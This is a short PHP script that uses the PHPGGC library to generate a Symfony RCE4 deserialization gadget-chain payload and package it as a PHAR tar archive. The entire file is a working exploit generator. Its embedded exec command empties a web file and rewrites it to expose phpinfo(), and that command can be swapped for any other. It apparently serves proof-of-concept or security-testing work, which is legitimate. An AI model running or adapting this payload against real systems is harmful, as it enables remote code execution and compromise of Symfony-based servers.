<?php

require 'vendor/ambionics/phpggc/lib/PHPGGC.php';

$gc = new \GadgetChain\Symfony\RCE4();
$parameters = $gc->process_parameters([
    'function' => 'exec',
    'parameter' => 'truncate -s 0 info.php; echo "<?php phpinfo();" >> info.php',
]);

# Generate the payload
$object = $gc->generate($parameters);
$object = $gc->process_object($object);
$serialized = \serialize($object);
$serialized = $gc->process_serialized($serialized);

# Display it
print($serialized . PHP_EOL);

# Create a PHAR file from this payload
$phar = new \PHPGGC\Phar\Tar($serialized);
file_put_contents('symfony_rce.phar.tar', $phar->generate());
